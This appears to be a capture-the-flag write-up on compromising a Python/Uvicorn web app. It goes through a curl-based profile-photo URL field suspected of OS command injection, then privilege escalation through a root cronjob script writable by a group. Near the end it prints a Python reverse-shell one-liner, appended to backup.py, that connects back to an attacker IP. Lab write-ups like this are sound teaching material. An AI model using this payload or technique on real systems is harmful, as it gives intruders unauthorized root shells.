# URL
https://mega.nz/file/WRF1xBiI#EtAQCcsY91lewgd_QVixl-wgSD2U1g1V6UKeuSQLRag
# Concept
* PyCurl
* OS command injection
* Linux group enumeration
* script hijacking
* cronjob abuse
# Method of solve
## Starting Scans
* there is a single port open on the server, `8000`, which is running a `Uvicorn` web server, which is associated with a `Python` backend
## Initial Access
* upon investigation of the web app, it seems like we can register a user for the app, so register, then login
* on login, we see that users can provide a URL to change their profile picture
* we start a Python server on our attacker machine, then send a request that changes the profile picture, using our attacker machine Python webserver as the URL
* after doing so, we look at the request in Burp Suite, and we see that the body of the POST request looks like this:
```
full_name=Target+User&email=target%40workconnect.com&bio=&photo_url=http%3A%2F%2F172.17.0.1%2Fexample.jpg
```
* when we look at the response, we see output that looks very similar to `curl` output
* if the web app is passing OS commands to the web app through user-controlled POST bodies, we might be able to perform an `OS command injection` attack
* 
## Privilege Escalation
* we are on the server as the `recruiter` user
* when we check the groups this user is part of, it looks like they're part of a non-standard group called `humanresources`
* when we check which files this group owns, it seems like they own a single file called `backup.py` in the `/opt` directory
* looking at this script, it seems to be a cronjob that's run by the `root` user every minute
* the privilege escalation vector is `script hijacking` and `cronjob abuse`, since the `backup.py` script is being run as a `root` run cronjob, and we have write permissions on the script, since we're part of the `humanresources` group
* so we'll slip in another reverse shell payload with the following command
```
echo 'import os,pty,socket;s=socket.socket();s.connect(("172.17.0.1",53));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' >> backup.py
```
* and now we're root
